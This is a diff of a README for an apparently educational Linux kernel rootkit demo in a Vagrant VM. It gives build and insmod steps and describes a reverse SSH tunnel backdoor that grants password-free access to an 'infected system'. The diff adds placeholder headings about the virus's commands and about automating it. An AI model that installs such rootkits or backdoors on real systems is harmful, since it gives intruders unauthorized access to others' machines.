@@ -53,7 +53,7 @@ In order to showcase our rootkit, we will be using a Vagrant VM running Ubuntu 1
 3. `vagrant ssh` 
 
 ### <u>Clean Build Instructions Once in Vagrant</u>
-1. ``` sudo apt-get install linux-headers-`uname -r` ``` **WE CAN AUTOMATE THIS STEP IN THE INIT FUNCTION OF ROOTKIT**
+1. ``` sudo apt-get install linux-headers-`uname -r` ```
 2. `cd /vagrant` to go to shared 'guest' folder
 3. `make all`
 4. `sudo insmod rootkit.ko`
@@ -64,3 +64,6 @@ In order to showcase our rootkit, we will be using a Vagrant VM running Ubuntu 1
 2. We have set up a reverse ssh tunnel, meaning that whenever our router sees we are sending a request to `localhost` on port `7000` it will divert this to port `22` of our infected system
 3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000` and you will have access to their system without the need for their password
 
+### <u>Showing Rootkit features<\u>
+1. Different commands of virus
+2. How to change code to make it automated
